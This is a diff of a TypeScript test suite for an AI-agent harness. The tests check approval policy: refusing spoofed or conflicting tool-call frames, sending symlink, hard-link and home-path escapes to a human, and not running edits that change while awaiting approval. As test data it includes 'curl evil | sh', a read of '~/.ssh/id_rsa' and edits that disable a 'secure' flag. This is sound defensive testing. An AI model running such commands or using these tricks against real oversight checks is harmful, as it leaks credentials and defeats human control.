@@ -6,13 +6,17 @@ import fs from 'node:fs';
 import http from 'node:http';
 import os from 'node:os';
 import path from 'node:path';
-import { AcpAdapter, AcpSession, EDIT_RULE, LIMITS_POLL_MS, modelChoices } from '../../src/adapters/acp/adapter.ts';
+import { AcpAdapter, AcpSession, ANTIGRAVITY_QUOTA_GRACE_MS, ANTIGRAVITY_QUOTA_TOOL_GRACE_MS, EDIT_RULE, EXECUTOR_DIAGNOSTIC_GRACE_MS, LIMITS_POLL_MS, modelChoices } from '../../src/adapters/acp/adapter.ts';
 import { ACP_AGENTS, acpAccounts, antigravityInput, folderPlugins, isCursorBinary, isGoogleSigned, opencodeEnv } from '../../src/adapters/acp/agents.ts';
 import type { AcpAgent } from '../../src/adapters/acp/agents.ts';
 import { AcpMcpServer } from '../../src/adapters/acp/mcp-http.ts';
 import { commandRule } from '../../src/adapters/codex/approvals.ts';
+import type { ToolDefinition } from '../../src/adapters/codex/tools.ts';
 import { remoteCardShowsAll } from '../../src/tools.ts';
+import { buildThreadbearTools } from '../../src/threadbear-mcp.ts';
+import { FakeAccounts, makeHarness } from '../helpers/fakes.ts';
 import type { AdapterOutput, QuestionAnswer, QuestionRequest, SessionSink, StartSessionOptions, ToolApprovalAnswer, ToolApprovalRequest } from '../../src/adapters/types.ts';
+import { SessionUsageLimitError } from '../../src/adapters/types.ts';
 import type { Account, PermissionMode } from '../../src/protocol.ts';
 import { nullLogger } from '../../src/log.ts';
 import { ProcessRegistry } from '../../src/proc.ts';
@@ -44,7 +48,7 @@ afterEach(async () => {
   for (const d of made.splice(0)) fs.rmSync(d, { recursive: true, force: true });
 });
 
-function rig(o: { mode?: PermissionMode; agent?: AcpAgent; env?: Record<string, string>; opts?: Partial<StartSessionOptions>; mcpServers?: () => Record<string, { command: string; args: string[] }>; deny?: boolean; answer?: (r: ToolApprovalRequest) => ToolApprovalAnswer | Promise<ToolApprovalAnswer>; question?: (r: QuestionRequest) => QuestionAnswer | Promise<QuestionAnswer> } = {}) {
+function rig(o: { mode?: PermissionMode; agent?: AcpAgent; env?: Record<string, string>; opts?: Partial<StartSessionOptions>; toolsFor?: (threadId: string) => ToolDefinition[]; mcpServers?: () => Record<string, { command: string; args: string[] }>; deny?: boolean; answer?: (r: ToolApprovalRequest) => ToolApprovalAnswer | Promise<ToolApprovalAnswer>; question?: (r: QuestionRequest) => QuestionAnswer | Promise<QuestionAnswer>; onOutput?: (output: AdapterOutput) => void } = {}) {
   const root = tmp();
   made.push(root);
   const cwd = path.join(root, 'work');
@@ -60,6 +64,7 @@ function rig(o: { mode?: PermissionMode; agent?: AcpAgent; env?: Record<string, 
   const sink: SessionSink = {
     output(out) {
       outputs.push(out);
+      o.onOutput?.(out);
       if (out.kind === 'result') results.splice(0).forEach((f) => f());
     },
     async requestApproval(req) {
@@ -83,6 +88,7 @@ function rig(o: { mode?: PermissionMode; agent?: AcpAgent; env?: Record<string, 
     log: nullLogger,
     env: { PATH: process.env.PATH, FAKE_ACP_LOG: logFile, ...o.env },
     timings: { closeWaitMs: 300 },
+    ...(o.toolsFor ? { toolsFor: o.toolsFor } : {}),
     ...(o.mcpServers ? { mcpServers: o.mcpServers } : {}),
   });
   const start = (): AcpSession => {
@@ -137,6 +143,7 @@ test('Ask: denying a card stops the write', async () => {
   await turn(r, s, `write ${file} hi`);
   assert.equal(fs.existsSync(file), false);
   assert.deepEqual((r.log().find((l) => l.answered) as { answered: unknown }).answered, { outcome: { outcome: 'selected', optionId: 'reject' } });
+  assert.deepEqual(r.outputs.flatMap((o) => o.kind === 'event' && o.event.type === 'tool.result' ? [o.event.text] : []), ['rejected']);
 });
 
 // The test Mike asked for: without the row's env the pretend agent, like the
@@ -1283,6 +1290,179 @@ test('Antigravity: no read goes ahead for an MCP tool, or with a line number tha
 const frame = (s: AcpSession, update: Record<string, unknown>) =>
   (s as unknown as { proc: { onNotification: (m: string, p: unknown) => void } }).proc.onNotification('session/update', { update: { sessionUpdate: 'tool_call', ...update } });
 
+test('Scoped ACP: missing metadata is carried forward and conflicting metadata is refused', async () => {
+  const checked: string[] = [];
+  const r = rig({ mode: 'full', opts: { coordinator: { role: 'coordinator', checkTool: ({ name }) => { checked.push(name); return undefined; } } } });
+  const s = r.start();
+  await ready(r, s);
+  const allow = [{ outcome: { outcome: 'selected', optionId: 'once' } }];
+  const reject = [{ outcome: { outcome: 'selected', optionId: 'reject' } }];
+
+  frame(s, { toolCallId: 'split', kind: 'search' });
+  frame(s, { toolCallId: 'split', sessionUpdate: 'tool_call_update', name: 'grep' });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'split' }), allow);
+  assert.equal(checked.at(-1), 'grep');
+
+  frame(s, { toolCallId: 'kinds', kind: 'fetch', name: 'lookup' });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'kinds', kind: 'search', name: 'lookup' }), reject);
+
+  frame(s, { toolCallId: 'names', kind: 'search', name: 'grep' });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'names', name: 'glob' }), reject);
+
+  frame(s, { toolCallId: 'preview', kind: 'read', content: [{ type: 'diff', path: 'README.md', oldText: 'One', newText: 'Two' }] });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'preview' }), reject);
+  assert.equal(r.cards.length, 0);
+});
+
+test('Scoped ACP: helper questions and external tools follow the scope using partial updates', async () => {
+  const questions: unknown[] = [];
+  let paused = false;
+  const r = agy({ mode: 'full', opts: { coordinator: {
+    role: 'helper',
+    checkTool: () => paused ? 'The coordinator is paused.' : undefined,
+    helperQuestion: (_thread, qs) => { questions.push(...qs); },
+  } } });
+  const s = r.start();
+  await ready(r, s);
+  const rawInput = { questions: [{ question: 'Which project file?' }] };
+  frame(s, { toolCallId: 'question', kind: 'other', name: 'ask_question', rawInput });
+  const request = fakeRequest(r, s, { toolCallId: 'question' });
+  assert.deepEqual(request, [{ outcome: { outcome: 'selected', optionId: 'reject' } }]);
+  assert.deepEqual(questions, [{ question: 'Which project file?', header: 'Helper question', options: [], multiSelect: false }]);
+  frame(s, { toolCallId: 'replaced', name: 'ask_question', rawInput });
+  frame(s, { toolCallId: 'replaced', sessionUpdate: 'tool_call_update', rawInput: {} });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'replaced' }), request);
+
+  frame(s, { toolCallId: 'edit', kind: 'edit', name: 'edit_file' });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'edit' }), [{ outcome: { outcome: 'selected', optionId: 'once' } }]);
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'empty', kind: '' }), request);
+
+  frame(s, { toolCallId: 'external', kind: 'search', _meta: { mcp: { server: 'documentation', tool: 'search' } } });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'external' }), [{ outcome: { outcome: 'selected', optionId: 'once' } }]);
+
+  const meta = { is_mcp_tool_call: true, mcp: { server: 'public-docs', tool: 'search' } };
+  frame(s, { toolCallId: 'confirmed', kind: 'search', name: 'public_docs_search', _meta: meta });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'confirmed' }), [{ outcome: { outcome: 'selected', optionId: 'once' } }]);
+  frame(s, { toolCallId: 'externalMismatch', kind: 'search', name: 'find_project', _meta: meta });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'externalMismatch' }), request);
+
+  paused = true;
+  frame(s, { toolCallId: 'paused', name: 'ask_question' });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'paused', rawInput: { questions: [{ question: 'Which date?' }] } }), request);
+  assert.equal(questions.length, 1);
+  assert.equal(r.cards.length, 0);
+});
+
+test('Scoped ACP: Full access still checks runner-owned MCP identity across acting frames', async () => {
+  const r = agy({
+    mode: 'full',
+    opts: { coordinator: { role: 'coordinator', checkTool: () => undefined } },
+    toolsFor: () => [{ name: 'read_project', description: 'Read project details', inputSchema: {}, handler: async () => ({ content: [] }) }],
+  });
+  const s = r.start();
+  await ready(r, s);
+  const meta = { is_mcp_tool_call: true, mcp: { server: 'threadbear', tool: 'read_project' } };
+  frame(s, { toolCallId: 'project', kind: 'other' });
+  const verified = fakeRequest(r, s, { toolCallId: 'project', _meta: meta });
+  assert.deepEqual(verified, [{ outcome: { outcome: 'selected', optionId: 'once' } }]);
+  frame(s, { toolCallId: 'sparse', kind: 'other', name: 'threadbear_read_project', _meta: meta });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'sparse' }), verified);
+
+  frame(s, { toolCallId: 'ambiguous', kind: 'other', _meta: { is_mcp_tool_call: true } });
+  const ambiguous = fakeRequest(r, s, { toolCallId: 'ambiguous', kind: 'other', _meta: meta });
+  assert.deepEqual(ambiguous, [{ outcome: { outcome: 'selected', optionId: 'reject' } }]);
+  frame(s, { toolCallId: 'unconfirmed', kind: 'other', _meta: { mcp: meta.mcp } });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'unconfirmed' }), ambiguous);
+  frame(s, { toolCallId: 'markedNative', kind: 'other', _meta: meta });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'markedNative', _meta: { is_mcp_tool_call: false } }), ambiguous);
+  frame(s, { toolCallId: 'otherName', kind: 'other', name: 'search_project_index', _meta: meta });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'otherName' }), ambiguous);
+  assert.equal(r.cards.length, 0);
+});
+
+test('ACP coordinator refusals show the policy reason, including when the agent never reports a result', async () => {
+  const r = rig({ mode: 'full', opts: { coordinator: { role: 'coordinator', checkTool: () => undefined } } });
+  const s = r.start();
+  await ready(r, s);
+  const shell = { toolCallId: 'shell-1', kind: 'execute', name: 'shell', rawInput: { command: 'echo hello' } };
+  frame(s, { ...shell, status: 'in_progress' });
+  const refused = fakeRequest(r, s, shell);
+  assert.equal(s['normalizer'].hasRunningTools(), false);
+  const provider = { ...shell, sessionUpdate: 'tool_call_update', status: 'failed', rawOutput: 'The user declined this tool call' };
+  frame(s, provider);
+  frame(s, provider);
+  const skill = { toolCallId: 'skill-1', kind: 'other', name: 'skill' };
+  const noUpdate = fakeRequest(r, s, skill, []);
+  frame(s, { ...skill, sessionUpdate: 'tool_call_update', rawInput: { name: 'example' }, rawOutput: 'The user declined this tool call' });
+  assert.equal(events(r.outputs, 'tool.call').length, 1, 'the policy refusal waits for a terminal frame or turn cleanup');
+  await turn(r, s, 'next', 'next');
+  assert.deepEqual(refused, [{ outcome: { outcome: 'selected', optionId: 'reject' } }]);
+  assert.deepEqual(noUpdate, [{ outcome: { outcome: 'cancelled' } }]);
+  assert.equal(r.cards.length, 0);
+  const toolRows = r.outputs.flatMap((o) => o.kind === 'event' && o.event.type === 'tool.call' ? [o.event.itemId] : []);
+  assert.deepEqual(toolRows, ['shell-1', 'skill-1']);
+  const denied = r.outputs.flatMap((o) => o.kind === 'event' && o.event.type === 'tool.result' ? [{ id: o.event.itemId, ok: o.event.ok, text: o.event.text }] : []);
+  assert.deepEqual(denied.map((o) => [o.id, o.ok]), [['shell-1', false], ['skill-1', false]]);
+  for (const o of denied) assert.match(o.text, /^Threadbear blocked this tool call\..*startHelper/);
+});
+
+test('Antigravity coordinators are guided to delegate unclassified web search without allowing the call', async () => {
+  const r = agy({ mode: 'full', opts: { resume: true, sessionId: 'ses-old', coordinator: { role: 'coordinator', checkTool: () => undefined } } });
+  const s = r.start();
+  await ready(r, s);
+  const search = { toolCallId: 'web-1', title: 'websearch', kind: 'other', rawInput: { query: 'example search' } };
+  frame(s, search);
+  const unclassified = fakeRequest(r, s, { toolCallId: search.toolCallId });
+  const missingKind = fakeRequest(r, s, { toolCallId: 'web-2', name: 'websearch', rawInput: search.rawInput });
+  const typed = fakeRequest(r, s, { ...search, toolCallId: 'typed-1', kind: 'search' });
+  const external = { ...search, toolCallId: 'mcp-1', _meta: { is_mcp_tool_call: true, mcp: { server: 'other', tool: 'websearch' } } };
+  const mcp = fakeRequest(r, s, external);
+  frame(s, { toolCallId: 'mixed-1', kind: 'edit', name: 'edit_file' });
+  const mixed = fakeRequest(r, s, { ...search, toolCallId: 'mixed-1', name: 'websearch' });
+  await turn(r, s, 'next', 'next');
+
+  assert.deepEqual(unclassified, [{ outcome: { outcome: 'selected', optionId: 'reject' } }]);
+  assert.deepEqual(missingKind, unclassified);
+  assert.deepEqual(typed, [{ outcome: { outcome: 'selected', optionId: 'once' } }]);
+  assert.deepEqual(mcp, unclassified);
+  assert.deepEqual(mixed, unclassified);
+  assert.equal(r.cards.length, 0);
+  const prompts = r.log().filter((l) => l.prompt).map((l) => String(l.prompt));
+  assert.equal(prompts.length, 2);
+  for (const prompt of prompts) assert.match(prompt, /web search.*startHelper/);
+  const denied = r.outputs.flatMap((o) => o.kind === 'event' && o.event.type === 'tool.result' ? [o.event] : []);
+  assert.match(denied.find((o) => o.itemId === 'web-1')?.text ?? '', /verify this web search as read-only.*startHelper/);
+  assert.match(denied.find((o) => o.itemId === 'web-2')?.text ?? '', /verify this web search as read-only.*startHelper/);
+  assert.match(denied.find((o) => o.itemId === 'mcp-1')?.text ?? '', /Delegate external tool calls/);
+  assert.match(denied.find((o) => o.itemId === 'mixed-1')?.text ?? '', /Delegate implementation/);
+});
+
+test('ACP shows the policy refusal when the end_turn MCP server never receives the call', async () => {
+  let calls = 0;
+  const paused = 'The coordinator is paused. Wait for Resume.';
+  const r = rig({
+    mode: 'full',
+    opts: { coordinator: { role: 'coordinator', checkTool: () => paused } },
+    toolsFor: () => [{ name: 'end_turn', description: 'End the turn', inputSchema: {}, handler: async () => {
+      calls++;
+      return { content: [{ type: 'text', text: 'Noted.' }] };
+    } }],
+  });
+  const s = r.start();
+  await ready(r, s);
+  const endTurn = { toolCallId: 'end-1', kind: 'other', name: 'mcp__threadbear__end_turn' };
+  const refused = fakeRequest(r, s, endTurn);
+  const repeated = fakeRequest(r, s, endTurn);
+  frame(s, { ...endTurn, sessionUpdate: 'tool_call_update', status: 'failed', rawOutput: 'The user declined this tool call' });
+  assert.deepEqual(refused, [{ outcome: { outcome: 'selected', optionId: 'reject' } }]);
+  assert.deepEqual(repeated, refused);
+  assert.equal(calls, 0);
+  assert.equal(r.cards.length, 0);
+  const notes = r.outputs.flatMap((o) => o.kind === 'event' && o.event.type === 'system.note' ? [o.event.text] : []);
+  assert.deepEqual(notes, [`Threadbear blocked this tool call. ${paused}`]);
+  assert.equal(events(r.outputs, 'tool.result').length, 0);
+});
+
 test('Antigravity: another MCP server\'s tool is never taken for a local command or edit, and no saved rule covers it', async () => {
   const r = agy({ deny: true });
   const s = r.start();
@@ -1439,6 +1619,92 @@ test("OpenCode's edit, named one way while it runs and another when it asks, is 
   const a = fakeRequest(r, s, { toolCallId: 'oc1', kind: 'edit', locations: [{ path: file }], rawInput: { filepath: file, diff: 'x' }, content: [{ type: 'diff', path: file, oldText: '', newText: 'hi' }] });
   await until(() => a.length === 1);
   assert.equal(r.cards.length, 0);
+});
+
+test('card reviewer: paths through a link out of the folder, `..` or `~` go to Mike unreviewed', async () => {
+  const r = rig({ mode: 'auto' });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  fs.writeFileSync(path.join(r.root, 'secret'), 'x');
+  fs.symlinkSync(path.join(r.root, 'secret'), path.join(home, 'README.md'));
+  fs.mkdirSync(path.join(r.root, 'elsewhere'));
+  fs.symlinkSync(path.join(r.root, 'elsewhere'), path.join(home, 'sub'));
+  const cases: [string, Record<string, unknown>][] = [
+    ['a link out', { kind: 'read', locations: [{ path: `${home}/README.md` }], rawInput: { path: `${home}/README.md` } }],
+    ['a link then ..', { kind: 'read', locations: [{ path: `${home}/sub/../secret` }], rawInput: { path: `${home}/sub/../secret` } }],
+    ['a home path', { kind: 'read', rawInput: { path: '~/.ssh/id_rsa' } }],
+  ];
+  for (const [i, [why, call]] of cases.entries()) {
+    const before = r.cards.length;
+    const a = fakeRequest(r, s, { toolCallId: `o${i}`, ...call });
+    await until(() => a.length === 1);
+    assert.equal(r.cards.length, before + 1, why);
+    assert.equal(r.cards.at(-1)!.noReview, true, why);
+  }
+  assert.match(r.cards[0].title, /outside this thread's folder/);
+});
+
+test('a call that says something new while its card waits is not run on the old answer', async () => {
+  for (const back of [false, true]) {
+    let release!: () => void;
+    const r = rig({ mode: 'auto', answer: () => new Promise((res) => (release = () => res({ decision: 'allow' }))) });
+    const s = r.start();
+    await ready(r, s);
+    const file = path.join(fs.realpathSync(r.cwd), 'auth.ts');
+    // Going back to an earlier frame counts as new too.
+    if (back) frame(s, { toolCallId: 'w1', kind: 'edit', locations: [{ path: file }], rawInput: { path: file, content: 'evil' } });
+    const a = fakeRequest(r, s, { toolCallId: 'w1', kind: 'edit', locations: [{ path: file }], rawInput: { path: file, content: 'safe' } });
+    await until(() => r.cards.length === 1);
+    frame(s, { toolCallId: 'w1', kind: 'edit', locations: [{ path: file }], rawInput: { path: file, content: 'evil' } });
+    release();
+    await until(() => a.length === 1);
+    assert.ok(r.outputs.some((o) => o.kind === 'event' && o.event.type === 'system.note' && /changed while it waited/.test(o.event.text)), String(back));
+    assert.notDeepEqual(a[0], { outcome: { outcome: 'selected', optionId: 'once' } }, String(back));
+  }
+});
+
+test('an edit whose folder becomes a link out while its card waits is not run', async () => {
+  let release!: () => void;
+  const r = rig({ mode: 'auto', answer: () => new Promise((res) => (release = () => res({ decision: 'allow' }))) });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  fs.mkdirSync(path.join(home, 'notes'));
+  fs.mkdirSync(path.join(r.root, 'dotclaude'));
+  const file = path.join(home, 'notes', 'settings.json');
+  const a = fakeRequest(r, s, { toolCallId: 'p1', kind: 'edit', locations: [{ path: file }], rawInput: { path: file, content: '{}' } });
+  await until(() => r.cards.length === 1);
+  fs.rmSync(path.join(home, 'notes'), { recursive: true });
+  fs.symlinkSync(path.join(r.root, 'dotclaude'), path.join(home, 'notes'));
+  release();
+  await until(() => a.length === 1);
+  assert.ok(r.outputs.some((o) => o.kind === 'event' && o.event.type === 'system.note' && /changed while it waited/.test(o.event.text)));
+  assert.notDeepEqual(a[0], { outcome: { outcome: 'selected', optionId: 'once' } });
+  assert.ok(!fs.existsSync(path.join(r.root, 'dotclaude', 'settings.json')));
+});
+
+test('an edit whose file becomes a hard link to one elsewhere while its card waits is not run, and one already linked is Mike\'s', async () => {
+  let release!: () => void;
+  const r = rig({ mode: 'auto', answer: () => new Promise((res) => (release = () => res({ decision: 'allow' }))) });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  const file = path.join(home, 'notes.json');
+  fs.writeFileSync(file, '{}');
+  fs.writeFileSync(path.join(r.root, 'settings.json'), '{}');
+  const a = fakeRequest(r, s, { toolCallId: 'h1', kind: 'edit', locations: [{ path: file }], rawInput: { path: file, content: '{"x":1}' } });
+  await until(() => r.cards.length === 1);
+  fs.rmSync(file);
+  fs.linkSync(path.join(r.root, 'settings.json'), file);
+  release();
+  await until(() => a.length === 1);
+  assert.notDeepEqual(a[0], { outcome: { outcome: 'selected', optionId: 'once' } });
+  const b = fakeRequest(r, s, { toolCallId: 'h2', kind: 'edit', locations: [{ path: file }], rawInput: { path: file, content: '{"x":2}' } });
+  await until(() => r.cards.length === 2);
+  assert.equal(r.cards[1].noReview, true);
+  release();
+  await until(() => b.length === 1);
 });
 
 test('the saved edit rule never covers a file outside the thread\'s folder, by path or through a link', async () => {
@@ -1779,6 +2045,8 @@ test("Antigravity: a coordinator's Agent Archive read goes ahead; a mismatched o
   const ok = fakeRequest(r, s, { toolCallId: 'a1', kind: 'other', _meta: archiveMeta, rawInput: { arguments: { query: 'South West Devs' } } });
   await until(() => ok.length === 1);
   assert.deepEqual(ok[0], { outcome: { outcome: 'selected', optionId: 'once' } });
+  frame(s, { toolCallId: 'a0', kind: 'other', _meta: archiveMeta });
+  assert.deepEqual(fakeRequest(r, s, { toolCallId: 'a0' }), ok);
   // An earlier frame said it was another server's tool.
   frame(s, { toolCallId: 'a2', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'production', tool: 'exec' } } });
   const mixed = fakeRequest(r, s, { toolCallId: 'a2', kind: 'other', _meta: archiveMeta, rawInput: {} });
@@ -1837,3 +2105,620 @@ test('OpenCode: models probe per-model thought_level options and turns apply and
   assert.deepEqual(sets().at(-1), { effort: 'default' });
 });
 
+
+test('card reviewer inputs: Antigravity shell and MCP cards pass full context and stay reviewable; opaque ACP edits and commands set noReview', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  const file = path.join(home, 'notes.txt');
+  // 1. Antigravity shell command: wholeInput carries resolved cwd and command, reviewable.
+  const a1 = fakeRequest(r, s, { toolCallId: 'r1', kind: 'execute', rawInput: { CommandLine: 'ls -la ' + home, Cwd: home } });
+  await until(() => a1.length === 1);
+  assert.equal(r.cards[0].noReview, undefined);
+  assert.equal(r.cards[0].wholeInput?.command, 'ls -la ' + home);
+  assert.equal(r.cards[0].wholeInput?.cwd, home);
+  // 2. Antigravity MCP call: wholeInput carries MCP tool identity and arguments, reviewable.
+  const a2 = fakeRequest(r, s, { toolCallId: 'r2', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'connectors', tool: 'sentry_get_issue_details' } }, rawInput: { arguments: { issue_id: '42' } } });
+  await until(() => a2.length === 1);
+  assert.equal(r.cards[1].noReview, undefined);
+  assert.equal((r.cards[1].wholeInput?.tool as Record<string, unknown>)?.['MCP tool'], 'connectors__sentry_get_issue_details');
+  assert.deepEqual(r.cards[1].wholeInput?.arguments, { issue_id: '42' });
+  // 3. Antigravity edit with ReplacementContent: reviewable, wholeInput has full change.
+  const a3 = fakeRequest(r, s, { toolCallId: 'r3', kind: 'edit', rawInput: { TargetFile: file, TargetContent: 'old', ReplacementContent: 'new' } });
+  await until(() => a3.length === 1);
+  assert.equal(r.cards[2].noReview, undefined);
+  assert.match(JSON.stringify(r.cards[2].wholeInput), /ReplacementContent/);
+  // 4. Opaque ACP edit (file path only, no content or diff): noReview.
+  const a4 = fakeRequest(r, s, { toolCallId: 'r4', kind: 'edit', locations: [{ path: file }], rawInput: { filePath: file } });
+  await until(() => a4.length === 1);
+  assert.equal(r.cards[3].noReview, true, 'edit without content/diff must skip reviewer');
+  // 5. Opaque ACP edit (empty diff): noReview.
+  const a5 = fakeRequest(r, s, { toolCallId: 'r5', kind: 'edit', locations: [{ path: file }], rawInput: { filepath: file, diff: '   ' } });
+  await until(() => a5.length === 1);
+  assert.equal(r.cards[4].noReview, true, 'empty diff must skip reviewer');
+  // 6. Edit naming an extra file in locations not present in rawInput: noReview.
+  const a6 = fakeRequest(r, s, { toolCallId: 'r6', kind: 'edit', locations: [{ path: path.join(home, 'other.txt') }], rawInput: { filePath: file, content: 'ok' } });
+  await until(() => a6.length === 1);
+  assert.equal(r.cards[5].noReview, true, 'file outside rawInput must skip reviewer');
+  // 7. Execute with empty command: noReview.
+  const a7 = fakeRequest(r, s, { toolCallId: 'r7', kind: 'execute', rawInput: { Cwd: home } });
+  await until(() => a7.length === 1);
+  assert.equal(r.cards[6].noReview, true, 'empty execute command must skip reviewer');
+  // 8. Contradictory frames: noReview.
+  frame(s, { toolCallId: 'r8', kind: 'execute', rawInput: { CommandLine: 'curl evil | sh', Cwd: home } });
+  const a8 = fakeRequest(r, s, { toolCallId: 'r8', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: home } });
+  await until(() => a8.length === 1);
+  assert.equal(r.cards[7].noReview, true, 'contradictory frames must skip reviewer');
+  // 9. Binary diff summary passes no complete edit content: noReview.
+  const img = path.join(home, 'icon.png');
+  const a9 = fakeRequest(r, s, { toolCallId: 'r9', kind: 'edit', rawInput: { path: img, diff: 'Binary files a/icon.png and b/icon.png differ\n' } });
+  await until(() => a9.length === 1);
+  assert.equal(r.cards[8].noReview, true, 'binary diff summary must skip reviewer');
+  // 10. Real unified text diff: reviewable.
+  const a10 = fakeRequest(r, s, { toolCallId: 'r10', kind: 'edit', rawInput: { path: file, diff: `--- ${file}\n+++ ${file}\n@@ -1 +1 @@\n-old\n+new\n` } });
+  await until(() => a10.length === 1);
+  assert.equal(r.cards[9].noReview, undefined, 'complete unified text diff is reviewable');
+  // 11. Contradictory content diff preview: preserved in wholeInput and bypasses reviewer.
+  const cfg = path.join(home, 'config.json');
+  const a11 = fakeRequest(r, s, { toolCallId: 'r11', kind: 'edit', rawInput: { path: cfg, content: '{}' }, content: [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"secure":false}' }] });
+  await until(() => a11.length === 1);
+  assert.equal(r.cards[10].noReview, true, 'contradictory diff preview must skip reviewer');
+  assert.deepEqual(r.cards[10].wholeInput?.diffs, [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"secure":false}' }]);
+  assert.deepEqual(r.cards[10].input.diffs, [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"secure":false}' }], 'user card also shows conflicting diff');
+  // 12. Search/replace preview with hidden extra change: bypasses reviewer.
+  const a12 = fakeRequest(r, s, { toolCallId: 'r12', kind: 'edit', rawInput: { path: cfg, old_string: 'a', new_string: 'b' }, content: [{ type: 'diff', path: cfg, oldText: 'a\nsecure: true', newText: 'b\nsecure: false' }] });
+  await until(() => a12.length === 1);
+  assert.equal(r.cards[11].noReview, true, 'search/replace preview with unmentioned changes must skip reviewer');
+  // 13. Matching content diff preview: stays reviewable and includes diffs in wholeInput.
+  const a13 = fakeRequest(r, s, { toolCallId: 'r13', kind: 'edit', rawInput: { path: cfg, content: '{"ok":true}' }, content: [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"ok":true}' }] });
+  await until(() => a13.length === 1);
+  assert.equal(r.cards[12].noReview, undefined, 'matching diff preview stays reviewable');
+  assert.deepEqual(r.cards[12].wholeInput?.diffs, [{ type: 'diff', path: cfg, oldText: '{}', newText: '{"ok":true}' }]);
+  // 14. Unnamed MCP call with generic name ("use_tool" or empty): bypasses reviewer.
+  const a14 = fakeRequest(r, s, { toolCallId: 'r14', kind: 'other', name: 'use_tool', _meta: { is_mcp_tool_call: true }, rawInput: { query: 'status' } });
+  await until(() => a14.length === 1);
+  assert.equal(r.cards[13].noReview, true, 'unnamed MCP tool with generic name must skip reviewer');
+  assert.equal((r.cards[13].wholeInput?.tool as Record<string, unknown>)?.['MCP tool'], 'not named');
+  // 15. Conflicting MCP tool across frames: bypasses reviewer.
+  frame(s, { toolCallId: 'r15', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'gmail', tool: 'send' } }, rawInput: { query: 'status' } });
+  const a15 = fakeRequest(r, s, { toolCallId: 'r15', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'local', tool: 'status' } }, rawInput: { query: 'status' } });
+  await until(() => a15.length === 1);
+  assert.equal(r.cards[14].noReview, true, 'conflicting MCP tool identity across frames must skip reviewer');
+  // 16. Execute with unresolvable Cwd: bypasses reviewer.
+  const a16 = fakeRequest(r, s, { toolCallId: 'r16', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: '/nonexistent/dir/for/test' } });
+  await until(() => a16.length === 1);
+  assert.equal(r.cards[15].noReview, true, 'execute with unknown cwd must skip reviewer');
+  // 17. Whitespace-only MCP server or tool component: bypasses reviewer.
+  const a17 = fakeRequest(r, s, { toolCallId: 'r17', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'local', tool: '   ' } }, rawInput: { query: 'status' } });
+  await until(() => a17.length === 1);
+  assert.equal(r.cards[16].noReview, true, 'whitespace-only MCP tool component must skip reviewer');
+});
+
+test('Antigravity: a harness crash (WS close code 1006) terminates the session with error without hanging', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  s.send({ id: 'turn-crash', text: 'crash_harness', images: [] });
+  await r.exited();
+  const err = r.exitError();
+  assert.ok(err, 'session must exit with error');
+  assert.match(err.message, /Harness process exited unexpectedly/i);
+});
+
+test('Antigravity: a chunked harness crash diagnostic across message chunks terminates without hanging', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  s.send({ id: 'turn-crash-chunked', text: 'crash_harness_chunked', images: [] });
+  await r.exited();
+  const err = r.exitError();
+  assert.ok(err, 'session must exit with error');
+  assert.match(err.message, /Harness process exited unexpectedly/i);
+});
+
+test('Antigravity: completed tool output with error words and assistant explanation of RESOURCE_EXHAUSTED do not kill session', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  await turn(r, s, 'tool_code_containing_error');
+  assert.equal(r.exitError(), null, 'session must not have exited');
+  const res = results(r.outputs);
+  assert.equal(res.length, 1);
+  assert.equal(res[0].outcome, 'completed');
+});
+
+async function quotaFailure(scenario = 'quota_fail', o: Parameters<typeof agy>[0] = {}) {
+  const failedTool = Promise.withResolvers<void>();
+  const r = agy({ mode: 'full', ...o, onOutput: (out) => {
+    o.onOutput?.(out);
+    if (out.kind === 'event' && out.event.type === 'tool.result' && !out.event.ok) failedTool.resolve();
+  } });
+  const s = r.start();
+  s.send({ id: 'turn-quota', text: scenario, images: [] });
+  const exit = r.exited();
+  await Promise.race([failedTool.promise, exit]);
+  assert.equal(r.exitError(), null, 'the prompt gets a chance to return');
+  return { r, s, exit };
+}
+
+test('Antigravity: a quota diagnostic sent before the failed tool status still ends an unanswered prompt', { timeout: 5000 }, async (t) => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const { r, exit } = await quotaFailure();
+  t.mock.timers.tick(ANTIGRAVITY_QUOTA_GRACE_MS);
+  await exit;
+  const err = r.exitError();
+  assert.ok(err, 'session must exit with error');
+  assert.match(err.message, /is out of Gemini usage.*Individual quota reached/i);
+});
+
+test('Antigravity: Stop during an unanswered quota failure exits without a usage error', { timeout: 5000 }, async (t) => {
